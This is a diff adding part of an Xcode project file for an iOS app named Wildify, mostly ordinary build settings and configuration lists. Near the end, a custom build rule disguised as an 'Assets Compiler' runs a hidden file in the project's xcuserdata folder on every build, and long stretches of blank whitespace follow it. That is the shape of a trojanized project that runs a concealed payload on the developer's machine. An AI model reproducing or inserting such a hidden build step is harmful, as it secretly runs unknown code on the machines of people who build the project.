+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		B76AA2CD2376BA1200D8E9D4 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = D1F6661140AD125A7890D899 /* Pods-Wildify.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 8PF2P6PZ42;
+				INFOPLIST_FILE = Wildify/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.5;
+				PRODUCT_BUNDLE_IDENTIFIER = zoohackathon.Wildify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		B76AA2CE2376BA1200D8E9D4 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = A081946F70B40E07D16D6F5E /* Pods-Wildify.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 8PF2P6PZ42;
+				INFOPLIST_FILE = Wildify/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.5;
+				PRODUCT_BUNDLE_IDENTIFIER = zoohackathon.Wildify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		B76AA2B32376BA1100D8E9D4 /* Build configuration list for PBXProject "Wildify" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				B76AA2CA2376BA1200D8E9D4 /* Debug */,
+				B76AA2CB2376BA1200D8E9D4 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		B76AA2CC2376BA1200D8E9D4 /* Build configuration list for PBXNativeTarget "Wildify" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				B76AA2CD2376BA1200D8E9D4 /* Debug */,
+				B76AA2CE2376BA1200D8E9D4 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		B1EA0D5AA25CBC5FD66D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+	};
+	rootObject = B76AA2B02376BA1100D8E9D4 /* Project object */;
+}
